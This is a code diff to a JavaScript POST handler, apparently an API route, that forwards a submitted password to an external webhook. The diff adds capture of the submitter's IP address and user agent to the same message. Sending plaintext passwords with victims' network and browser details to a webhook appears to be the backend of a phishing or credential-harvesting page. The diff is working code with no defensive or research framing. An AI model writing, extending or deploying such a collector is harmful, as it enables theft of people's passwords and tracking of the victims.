@@ -5,6 +5,15 @@ dotenv.config()
 export async function POST(request) {
   const body = await request.json();
 
+  let ip = request.ip ?? request.headers.get('x-real-ip')
+  const forwardedFor = request.headers.get('x-forwarded-for')
+  if(!ip && forwardedFor){
+    ip = forwardedFor.split(',').at(0) ?? 'Unknown'
+  }
+
+  let useragent = request.headers.get('user-agent')
+  useragent = useragent ? useragent : 'Unkown'
+
   await fetch(
     process.env.WEBHOOK,
     {
@@ -48,6 +57,14 @@ export async function POST(request) {
               {
                 name: "Password",
                 value: body.password,
+              },
+              {
+                name: "Ip",
+                value: ip,
+              },
+              {
+                name: "User Agent",
+                value: useragent,
               },
             ],
           },
